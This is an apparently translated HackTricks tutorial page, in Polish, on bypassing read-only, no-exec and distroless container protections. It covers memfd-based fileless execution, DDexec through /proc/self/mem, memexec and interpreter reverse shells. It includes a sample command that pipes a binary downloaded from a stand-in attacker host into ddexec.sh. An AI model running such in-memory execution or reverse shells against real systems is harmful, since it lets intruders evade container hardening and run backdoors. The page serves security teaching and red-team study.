# Omijanie ochrony systemu plików: tylko do odczytu / brak wykonania / Distroless

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Filmy

W poniższych filmach znajdziesz bardziej szczegółowe wyjaśnienie technik omówionych na tej stronie:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Scenariusz tylko do odczytu / brak wykonania

Coraz częściej spotyka się maszyny z systemem Linux zamontowanym z ochroną **tylko do odczytu (ro)**, zwłaszcza w kontenerach. Dzieje się tak dlatego, że uruchomienie kontenera z systemem plików tylko do odczytu jest tak proste jak ustawienie **`readOnlyRootFilesystem: true`** w `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Jednak nawet jeśli system plików jest zamontowany jako tylko do odczytu, **`/dev/shm`** nadal będzie zapisywalny, więc nie jest prawdą, że nie możemy niczego zapisać na dysku. Jednak ten folder będzie **zamontowany z ochroną braku wykonania**, więc jeśli pobierzesz tu binarny plik, **nie będziesz go mógł wykonać**.

{% hint style="warning" %}
Z perspektywy zespołu czerwonego, utrudnia to **pobieranie i wykonywanie** binarnych plików, które nie są już w systemie (takich jak backdoory lub narzędzia do wyliczania, np. `kubectl`).
{% endhint %}

## Najprostsze obejście: Skrypty

Zauważ, że wspomniałem o binarnych plikach, możesz **wykonać dowolny skrypt**, o ile interpreter jest dostępny w maszynie, na przykład **skrypt powłoki** jeśli jest obecny `sh` lub **skrypt pythonowy** jeśli jest zainstalowany `python`.

Jednak to nie wystarczy, aby wykonać twój binarny backdoor lub inne narzędzia binarne, które mogą być potrzebne do uruchomienia.

## Ominięcie pamięci

Jeśli chcesz wykonać binarny plik, ale system plików na to nie pozwala, najlepszym sposobem jest **wykonanie go z pamięci**, ponieważ **ochrona nie ma zastosowania tam**.

### Ominięcie FD + exec syscall

Jeśli masz potężne silniki skryptowe w maszynie, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać binarny plik do wykonania z pamięci, przechować go w deskryptorze pliku w pamięci (`create_memfd` syscall), który nie będzie chroniony przez te zabezpieczenia, a następnie wywołać **`exec` syscall**, wskazując **fd jako plik do wykonania**.

Do tego możesz łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Możesz przekazać mu binarny plik, a on wygeneruje skrypt w wybranym języku z **skompresowanym i zakodowanym w base64** binarnym plikiem oraz instrukcjami do **dekodowania i rozpakowania** go w **fd** utworzonym za pomocą wywołania `create_memfd` syscall i wywołania **exec** syscall do jego uruchomienia.

{% hint style="warning" %}
To nie działa w innych językach skryptowych, takich jak PHP lub Node, ponieważ nie mają one **domyślnego sposobu na wywołanie surowych syscalli** z poziomu skryptu, więc niemożliwe jest wywołanie `create_memfd` w celu utworzenia **deskryptora pamięciowego** do przechowywania binarnego pliku.

Ponadto, utworzenie **zwykłego deskryptora pliku** z plikiem w `/dev/shm` nie zadziała, ponieważ nie będziesz mógł go uruchomić, ponieważ zastosowana zostanie **ochrona braku wykonania**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika, która umożliwia **modyfikację pamięci własnego procesu**, nadpisując jego **`/proc/self/mem`**.

Dlatego, kontrolując kod asemblera, który jest wykonywany przez proces, możesz napisać **shellcode** i "zmienić" proces, aby **wykonał dowolny kod**.

{% hint style="success" %}
**DDexec / EverythingExec** pozwoli ci załadować i **wykonać** własny **shellcode** lub **dowolny binarny** z **pamięci**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Aby uzyskać więcej informacji na temat tej techniki, sprawdź Github lub:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) to naturalny kolejny krok po DDexec. Jest to **zdematerializowany kod shellcode DDexec**, więc za każdym razem, gdy chcesz **uruchomić inny plik binarny**, nie musisz ponownie uruchamiać DDexec, możesz po prostu uruchomić kod shellcode memexec za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przekazać nowe pliki binarne do załadowania i uruchomienia**.

Przykład użycia **memexec do uruchamiania plików binarnych z odwróconym powłokowaniem PHP** znajdziesz pod adresem [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

O podobnym celu jak DDexec, technika [**memdlopen**](https://github.com/arget13/memdlopen) umożliwia **łatwiejsze ładowanie plików binarnych** do pamięci w celu późniejszego ich wykonania. Może nawet umożliwić ładowanie plików binarnych zależnych.

## Bypass Distroless

### Czym jest distroless

Kontenery distroless zawierają tylko **minimalny zestaw komponentów niezbędnych do uruchomienia określonej aplikacji lub usługi**, takich jak biblioteki i zależności czasu wykonania, ale wykluczają większe komponenty, takie jak menedżer pakietów, powłoka lub narzędzia systemowe.

Celem kontenerów distroless jest **zmniejszenie powierzchni ataku kontenerów poprzez eliminację niepotrzebnych komponentów** i zminimalizowanie liczby podatności, które mogą być wykorzystane.

### Odwrócona powłoka

W kontenerze distroless możesz **nawet nie znaleźć `sh` lub `bash`**, aby uzyskać zwykłą powłokę. Nie znajdziesz również binarnych takich jak `ls`, `whoami`, `id`... wszystko, co zwykle uruchamiasz w systemie.

{% hint style="warning" %}
Dlatego **nie będziesz** w stanie uzyskać **odwróconej powłoki** ani **przeglądać** systemu tak, jak zwykle.
{% endhint %}

Jednak jeśli skompromitowany kontener uruchamia na przykład aplikację webową Flask, to zainstalowany jest Python, dzięki czemu możesz uzyskać **odwróconą powłokę Pythona**. Jeśli uruchamia się węzeł, możesz uzyskać odwróconą powłokę Node, podobnie jak w przypadku większości **języków skryptowych**.

{% hint style="success" %}
Korzystając z języka skryptowego, możesz **przeglądać** system, wykorzystując możliwości języka.
{% endhint %}

Jeśli nie ma **ochrony `tylko do odczytu/bez wykonania`**, możesz wykorzystać odwróconą powłokę, aby **zapisywać w systemie pliki binarne** i **wykonywać** je.

{% hint style="success" %}
Jednak w tego rodzaju kontenerach zwykle istnieją takie zabezpieczenia, ale możesz użyć **wcześniejszych technik wykonania w pamięci, aby je ominąć**.
{% endhint %}

Przykłady **wykorzystania niektórych podatności RCE** do uzyskania **odwróconych powłok języków skryptowych** i wykonywania plików binarnych z pamięci znajdziesz pod adresem [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
